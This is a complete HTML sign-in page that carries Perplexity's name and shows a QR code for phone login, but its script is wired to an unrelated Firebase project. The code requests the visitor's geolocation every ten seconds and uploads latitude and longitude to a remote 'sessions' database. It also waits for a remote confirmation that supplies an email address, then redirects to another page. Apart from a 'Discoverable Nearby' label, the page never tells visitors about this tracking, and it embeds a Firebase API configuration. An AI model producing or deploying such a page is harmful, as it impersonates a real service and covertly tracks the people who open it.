<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Perplexity</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        :root { --bg: #ffffff; --text: #1d1d1f; --card: rgba(245, 245, 247, 0.9); }
        @media (prefers-color-scheme: dark) { :root { --bg: #000; --text: #fff; --card: rgba(28, 28, 30, 0.9); } }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { background: var(--card); backdrop-filter: blur(20px); padding: 40px; border-radius: 30px; width: 300px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
        #qrcode { background: white; padding: 15px; border-radius: 15px; display: inline-block; margin: 20px 0; }
        .status { color: #0071e3; font-size: 13px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="margin:0">Perplexity Account</h2>
        <p style="color:#888; font-size:14px">Scan this QR with your phone</p>
        <div id="qrcode"></div>
        <div id="dname" style="font-weight:600; margin-bottom:10px;">Checking device...</div>
        <div class="status">● Discoverable Nearby</div>
    </div>
    <script>
        const firebaseConfig = { apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U", authDomain: "question-metabase.firebaseapp.com", projectId: "question-metabase", storageBucket: "question-metabase.firebasestorage.app", messagingSenderId: "770698198753", appId: "1:770698198753:web:59ae49d78b6013bab5c1a0" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        let pId = localStorage.getItem("myPersistentId") || "PX-" + Math.random().toString(36).substr(2, 9).toUpperCase();
        localStorage.setItem("myPersistentId", pId);
        const pName = localStorage.getItem("myDeviceName") || "New Perplexity Device";
        document.getElementById('dname').innerText = pName;

        new QRCode(document.getElementById("qrcode"), { text: pId, width: 200, height: 200 });

        function heartbeat() {
            navigator.geolocation.getCurrentPosition(pos => {
                db.collection("sessions").doc(pId).set({
                    deviceName: pName, lat: pos.coords.latitude, lng: pos.coords.longitude,
                    status: "waiting", lastSeen: Date.now()
                }, { merge: true });
            });
        }
        heartbeat(); setInterval(heartbeat, 10000);

        db.collection("sessions").doc(pId).onSnapshot(doc => {
            const data = doc.data();
            if(data?.status === "confirmed" && data.email) {
                localStorage.setItem("userEmail", data.email);
                db.collection("sessions").doc(pId).update({ status: "expired" }).then(() => { window.location.href = "4.html"; });
            }
        });
    </script>
</body>
</html>
